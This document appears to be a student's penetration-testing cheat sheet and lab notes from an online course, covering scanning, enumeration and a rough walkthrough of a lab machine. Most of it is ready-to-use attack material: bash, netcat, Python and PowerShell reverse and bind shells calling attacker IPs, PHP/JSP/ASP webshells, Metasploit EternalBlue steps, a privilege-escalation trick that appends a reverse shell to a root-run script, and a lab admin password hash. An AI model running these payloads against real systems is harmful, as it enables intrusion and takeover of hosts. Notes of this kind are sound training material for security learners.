# GettingStarted(Complete)

## Basic Tools 
> - **Connect to VPN **  sudo openvpn user.ovpn   
> - **Connect to FTP **  ftp 10.0.0.0   
> - **Connect to SSH **  ssh user@10.0.0.0   


    
## Service Scanning 
> - **Run an nmap script scan on an IP **  nmap -sV -sC -p- 10.0.0.0   
> - **Grab banner of an open port **  netcat 10.10.10.10 22   
> - **List SMB Shares **  smbclient -N -L \\\\10.129.42.253   
> - **Connect to a SMB Share **  smbclient \\\\10.129.42.253\\users
> - **Grab banner of an open port **  netcat 10.10.10.10 22
> - **Grab banner of an open port **  netcat 10.10.10.10 22


   
  
## WEB Enumb
> - **scan web directories** gobuster dir -u http://10.10.10.121/ -w /usr/share/dirb/wordlists/common.txt
> - **scan sub directories of a website** gobuster dns -d inlanefreight.com -w /usr/share/SecLists/Discovery/DNS/namelist.txt
> - **List potential directories** curl 10.10.10.121/robots.txt
> - **grab website banner** curl -IL https://www.inlanefreight.com
> - **List details about webserver/certs** whatweb 10.10.10.121 or whatweb --no-errors 10.10.10.0/24


    

## Exploit Scan
> - **Install exploitdb tool** sudo apt install exploitdb -y
> - **Search for public exploits for a web application** searchsploit openssh 7.2
### Metasploit
Metasploit Framework (MSF) contains exploits for many public vulnerabilities and provides an easy way to use these exploits against vulnerable targets
> - **MSF: Start the Metasploit Framework** msfconsole
> - **Search for public exploits in MSF** search exploit eternalblue
> - **Start using an MSF module** use exploit/windows/smb/ms17_010_psexec
> - **Show required options for an MSF module** show options
> - **Set a value for an MSF module option** set RHOSTS 10.10.10.40
> - **Test if the target server is vulnerable** check
> - **Run the exploit on the target server is vulnerable** exploit
     
    

## Using SHells
netcat can be used to connect to any listening port and interact with the service running on that port.
> - **Start a nc listener on a local port (on my computer)** nc -lvnp 1234  or   nc 10.10.10.1 1234
> - **Send a reverse shell from the remote server** bash -c 'bash -i >& /dev/tcp/10.10.10.10/1234 0>&1'
> - **Another reverse shell from the remote server** rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 1234 >/tmp/f
> - **Start a bind shell on the remote server** rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc -lvp 1234 >/tmp/f
> - **same as above but with powershell** powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("10.10.10.10",1234);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
> - **Connect to a bind shell started on the remote server (on my computer)** nc 10.10.10.1 1234
>
> - **Upgrade shell TTY (1)** python -c 'import pty; pty.spawn("/bin/bash")'
> - **Upgrade shell TTY (2)** ctrl+z then stty raw -echo then fg then enter twice
> - **Create a webshell php file** echo "<?php system(\$_GET['cmd']);?>" > /var/www/html/shell.php
> - Apache	/var/www/html/   Nginx	/usr/local/nginx/html/   IIS	c:\inetpub\wwwroot\   XAMPP	C:\xampp\htdocs\
> - **Execute a command on an uploaded webshell** curl http://SERVER_IP:PORT/shell.php?cmd=id



  > whatweb --no-errors 10.10.10.0/24
  # 
  > 
  # install seclists = git clone https://github.com/danielmiessler/SecLists && sudo apt install seclists -y
  # Next, add a DNS Server such as 1.1.1.1 to the /etc/resolv.conf file.
  > 






## NCAT
# netcat can be used to connect to any listening port and interact with the service running on that port.
> ncat ip port 
> nc -nv ip port

## NMAP
# port scanner
> nmap -sV -sC -p- 10.129.42.253
> nmap -sV --open -oA nibbles_initial_scan <ip address>
> whatweb --no-errors 10.10.10.0/24
> nmap -sV --script=banner -p21 10.10.10.0/24
> nmap -sC -sV -p21 10.129.42.253
> nmap --script smb-os-discovery.nse -p445 10.10.10.40
> nmap -A -p445 10.129.42.253

> locate scripts/citrix
> nmap --script <script name> -p<port> <host>
  


  # on host
  > bash -c 'bash -i >& /dev/tcp/10.10.10.10/1234 0>&1'
  > rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 1234 >/tmp/f
  > powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("10.10.10.10",1234);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
## BIND Shell
  #
  > rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc -lvp 1234 >/tmp/f
  > python -c 'exec("""import socket as s,subprocess as sp;s1=s.socket(s.AF_INET,s.SOCK_STREAM);s1.setsockopt(s.SOL_SOCKET,s.SO_REUSEADDR, 1);s1.bind(("0.0.0.0",1234));s1.listen(1);c,a=s1.accept();\nwhile True: d=c.recv(1024).decode();p=sp.Popen(d,shell=True,stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE);c.sendall(p.stdout.read()+p.stderr.read())""")'
> powershell -NoP -NonI -W Hidden -Exec Bypass -Command $listener = [System.Net.Sockets.TcpListener]1234; $listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + " ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();
## Once in
  > python -c 'import pty; pty.spawn("/bin/bash")'
  
## WEB SHELLS
Apache	/var/www/html/   Nginx	/usr/local/nginx/html/   IIS	c:\inetpub\wwwroot\   XAMPP	C:\xampp\htdocs\
php = <?php system($_REQUEST["cmd"]); ?>
jsp = <% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
asp = <% eval request("cmd") %>
  # eg = echo '<?php system($_REQUEST["cmd"]); ?>' > /var/www/html/shell.php
  # browser http://SERVER_IP:PORT/shell.php?cmd=id    or curl http://SERVER_IP:PORT/shell.php?cmd=id
  
## Privilege Escalation
# ./linpeas.sh
  > dpkg -l
  > sudo -l
  > sudo -u user /bin/echo Hello World!
  # /etc/crontab     /etc/cron.d      /var/spool/cron/crontabs/root
  
  
## Transfer Files
  # cd /tmp
  > python3 -m http.server 8000
  > wget http://10.10.14.1:8000/linenum.sh
  > curl http://10.10.14.1:8000/linenum.sh -o linenum.sh
  >  scp linenum.sh user@remotehost:/tmp/linenum.sh
  # BASE64
  > base64 file -w 0
  > user@remotehost$ echo f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAA... <SNIP> ...lIuy9iaW4vc2gAU0iJ51JXSInmDwU | base64 -d > file
  
##########################################################################################

* File Inclusion / Directory Traversal (HTB Academy)
* Linux Fundermentals (HTB Academy)
* Login Attacks (HTB Academy)
* Metasploit (HTB Academy)
* Nmap (HTB Academy)
* Web Enumeration
* Windows Fundermentals (HTB Academy)


  _______________________
  

nmap -sV --open -oA nibbles_initial_scan <ip address>
nmap -p- --open -oA nibbles_full_tcp_scan 10.129.42.190
nc -nv 10.129.42.190 22
nmap -sC -p 22,80 -oA nibbles_script_scan 10.129.42.190
nmap -sV --script=http-enum -oA nibbles_nmap_http_enum 10.129.42.190 
whatweb 10.129.42.190


gobuster dir -u http://10.129.42.190/nibbleblog/ --wordlist /usr/share/dirb/wordlists/common.txt

rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <ATTACKING IP> <LISTENING PORT) >/tmp/f
<?php system ("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.246 9443 >/tmp/f"); ?>
nc -lvnp 9443
python -c 'import pty; pty.spawn("/bin/bash")'
 python3 -c 'import pty; pty.spawn("/bin/bash")'


unzip personal.zip
cat monitor.sh
sudo python3 -m http.server 8080
wget http://<your ip>:8080/LinEum.sh
chmod +x LinEnum.sh
./LinEnum.sh


https://github.com/vanhauser-thc/thc-hydra
https://github.com/digininja/CeWL
https://highon.coffee/blog/reverse-shell-cheat-sheet/!

<?php system ("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.5 9443 >/tmp/f"); ?>
nc -lvnp 9443
navigate to the webfile and should get a hit on the listner as shell
upgrade to nicer shell via which python3 commmand
python -c 'import pty; pty.spawn("/bin/bash")' OR python -c 'import pty; pty.spawn("/bin/bash")' OR python3 -c 'import pty; pty.spawn("/bin/bash")'
to enumerate priv esculations run this while listening - sudo python3 -m http.server 8080
https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
Back on the target type wget http://<your ip>:8080/LinEum.sh to download the script
Once the script is pulled over, type chmod +x LinEnum.sh to make the script executable and then type ./LinEnum.sh to run it.
modify monitor.py script to add line at the end
echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.5 8443 >/tmp/f' | tee -a monitor.sh


10.129.42.249 target
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
/theme
/data
/backups
{"status":"0","latest":"3.3.16","your_version":"3.3.15","message":"You have an old version - please upgrade"}
10.10.15.24 me
<USR>admin</USR>
<NAME/>
<PWD>d033e22ae348aeb5660fc2140aec35850c4da997</PWD>
<EMAIL>admin@gettingstarted.com</EMAIL>

nmap -sV --open -oA nibbles_initial_scan 10.129.42.249 
nmap -p- --open -oA nibbles_full_tcp_scan 10.129.42.249 

nc -nv 10.129.42.249 22
nc -nv 10.129.42.249 80

nmap -sC -p 22,80 -oA nibbles_script_scan 10.129.42.249
nmap -sV --script=http-enum -oA nibbles_nmap_http_enum 10.129.42.249

whatweb 10.129.42.249
gobuster dir -u http://10.129.42.249/data/ --wordlist /usr/share/dirb/wordlists/common.txt

<?php system ("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.129.42.249 4444 >/tmp/f"); ?>
